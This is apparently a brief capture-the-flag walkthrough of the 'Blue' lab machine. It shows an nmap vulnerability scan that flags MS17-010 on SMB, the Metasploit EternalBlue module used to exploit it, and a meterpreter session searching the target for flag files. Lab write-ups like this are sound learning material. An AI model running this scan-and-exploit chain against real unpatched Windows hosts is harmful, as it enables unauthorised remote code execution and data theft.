6 AUG 2021 

# challenge : blue 
ip : 10.10.94.186


SCANNING
=========

intial
--------
$nmap -Pn -sV -v --script vuln 10.10.94.186 -oN nmap/intial


`````bash
PORT      STATE    SERVICE            VERSION
135/tcp   open     msrpc              Microsoft Windows RPC
139/tcp   open     netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open     microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)

`````

````bash
Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE

````
using: 

exploit/windows/smb/ms17_010_eternalblue    

modify RHOSTS and LHOSTS


`````bash


meterpreter > search -f flag*
Found 6 results...
    c:\flag1.txt (24 bytes)
    c:\Users\Jon\AppData\Roaming\Microsoft\Windows\Recent\flag1.lnk (482 bytes)
    c:\Users\Jon\AppData\Roaming\Microsoft\Windows\Recent\flag2.lnk (848 bytes)
    c:\Users\Jon\AppData\Roaming\Microsoft\Windows\Recent\flag3.lnk (2344 bytes)
    c:\Users\Jon\Documents\flag3.txt (37 bytes)
    c:\Windows\System32\config\flag2.txt (34 bytes)

`````


# typical eternal blue exploitation .    
